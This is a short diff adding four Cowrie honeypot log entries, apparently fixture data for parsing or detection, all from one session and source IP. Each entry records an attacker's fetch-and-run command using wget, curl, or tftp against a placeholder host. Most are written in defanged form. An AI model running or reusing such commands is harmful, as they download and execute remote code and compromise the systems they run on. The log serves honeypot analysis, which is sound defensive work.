@@ -1,0 +1,4 @@
+{"eventid":"cowrie.command.input","timestamp":"2026-11-07T10:00:00.000000Z","src_ip":"198.51.100.10","session":"a1b2c3d4e5f6","input":"cd /tmp; wget hxxp[:]//192[.]0[.]2[.]5/x.sh; chmod +x x.sh; ./x.sh"}
+{"eventid":"cowrie.command.input","timestamp":"2026-11-07T10:00:00.000000Z","src_ip":"198.51.100.10","session":"a1b2c3d4e5f6","input":"curl -s hxxp[:]//192[.]0[.]2[.]5/i | sh"}
+{"eventid":"cowrie.command.input","timestamp":"2026-11-07T10:00:00.000000Z","src_ip":"198.51.100.10","session":"a1b2c3d4e5f6","input":"tftp -g -r t.sh 192.0.2.5; sh t.sh"}
+{"eventid":"cowrie.command.input","timestamp":"2026-11-07T10:00:00.000000Z","src_ip":"198.51.100.10","session":"a1b2c3d4e5f6","input":"wget -qO- hxxp[:]//192[.]0[.]2[.]5/b | bash"}
